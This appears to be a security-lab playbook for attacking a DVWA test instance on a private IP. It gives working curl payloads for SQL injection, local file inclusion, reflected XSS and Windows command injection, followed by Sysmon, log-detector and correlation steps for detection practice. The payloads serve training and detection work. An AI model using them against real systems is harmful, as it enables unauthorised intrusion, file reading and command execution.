# Web Attack Scenario Playbook

Exact, verified-working commands to reproduce all four web attacks against DVWA,
including the authentication step that's required before any of them will actually
execute (rather than silently redirecting to the login page). All commands run in
Kali's terminal. Replace `192.168.20.41` with your actual DVWA host IP if different.

## Step 0 — one-time setup: authenticate

DVWA requires a logged-in session and a CSRF token for every meaningful request.
Without this, attacks return HTTP 302 (redirect to login) and never actually execute.

```bash
# 1. Get the login page and save the session cookie it issues
curl -c cookies.txt -o login.html http://192.168.20.41/DVWA/login.php

# 2. Find the CSRF token (changes every session -- can't be hardcoded)
cat login.html | grep user_token
# Copy the value between the last pair of quotes

# 3. Log in for real, using that token
curl -b cookies.txt -c cookies.txt -d "username=admin&password=password&user_token=PASTE_TOKEN_HERE&Login=Login" http://192.168.20.41/DVWA/login.php

# 4. Confirm it worked -- should show DVWA's menu, not a login form
curl -b cookies.txt http://192.168.20.41/DVWA/index.php
```

## Step 0.5 — confirm security level is Low

Check with `curl -b cookies.txt http://192.168.20.41/DVWA/index.php | grep -i "security level"`.
If it shows anything other than `low`, reset it:

```bash
curl -b cookies.txt -o security.html http://192.168.20.41/DVWA/security.php
cat security.html | grep user_token
curl -b cookies.txt -c cookies.txt -d "security=low&seclev_submit=Submit&user_token=PASTE_TOKEN_HERE" http://192.168.20.41/DVWA/security.php
```

## Attack 1 — SQL Injection

```bash
curl -b cookies.txt -G "http://192.168.20.41/DVWA/vulnerabilities/sqli/" --data-urlencode "id=1' OR '1'='1" --data-urlencode "Submit=Submit"
```
**Success looks like:** multiple user rows returned (5 rows) instead of the single row a
normal ID lookup would return.

## Attack 2 — Path Traversal / Local File Inclusion

```bash
curl -b cookies.txt -G "http://192.168.20.41/DVWA/vulnerabilities/fi/" --data-urlencode "page=C:/windows/win.ini"
```
**Success looks like:** real contents of `win.ini` (`[fonts]`, `[extensions]`, etc.)
appear in the response. Note: use a Windows path (`C:/windows/win.ini`), not
`/etc/passwd` -- the target is Windows, not Linux.

## Attack 3 — Reflected XSS

```bash
curl -b cookies.txt "http://192.168.20.41/DVWA/vulnerabilities/xss_r/?name=<script>alert(1)</script>"
```
**Success looks like:** the literal `<script>alert(1)</script>` appears unescaped in the
HTML response.

## Attack 4 — Command Injection (the flagship scenario)

```bash
curl -b cookies.txt --data-urlencode "ip=127.0.0.1 & whoami" --data-urlencode "Submit=Submit" http://192.168.20.41/DVWA/vulnerabilities/exec/
```
**Important syntax notes, both cost real time to discover:**
- Must be a **POST** (`--data-urlencode` without `-G` does this) -- DVWA's form is
  hardcoded to POST, a GET request with the same parameters never triggers the handler.
- Must use `&` as the command separator, not `;` -- the target runs Windows `cmd.exe`,
  which uses `&` to chain commands (`;` is Unix/Linux syntax and won't work).

**Success looks like:** real `ping` output followed by the actual output of `whoami`
(e.g. `nt authority\system`).

**To confirm it genuinely executed** (not just that DVWA rendered something), check
Sysmon on the Windows-DVWA machine, in an **elevated** PowerShell:
```powershell
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; Id=1} -MaxEvents 30 | ForEach-Object { $_.Message } | Select-String -Pattern "httpd"
```
Look for `ParentImage: C:\xampp\apache\bin\httpd.exe` with `Image: C:\Windows\System32\cmd.exe`.

## After running attacks — generate detections and correlate

On the Windows-DVWA machine:
```powershell
& "C:\Program Files\VMware\VMware Workstation\vmrun.exe" -T ws -gu soc -gp "<password>" copyFileFromGuestToHost "<path-to-victim.vmx>" "C:\xampp\apache\logs\access.log" "webattack\access.log"
python webattack\weblog_detector.py --log "webattack\access.log" --computer DESKTOP-JC89B03
```
Then run your normal hunt (Chainsaw) so the endpoint side picks up the
`web_server_spawns_shell.yml` detection, then:
```powershell
python correlation\correlate.py
```
